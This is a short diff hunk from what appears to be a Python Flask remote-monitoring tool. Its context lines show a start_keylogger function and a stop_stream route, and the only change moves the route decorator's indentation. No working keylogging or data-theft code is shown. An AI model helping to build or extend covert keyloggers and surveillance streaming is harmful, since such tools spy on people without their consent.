@@ -92,7 +92,7 @@ def start_keylogger():
         keylogger_running = True
         print(Fore.YELLOW + "[ * ] Keylogger started.")
 
-@app.route('/stop_stream')
+    @app.route('/stop_stream')
     def stop_stream():
         global streaming
         streaming = False  # Stop streaming
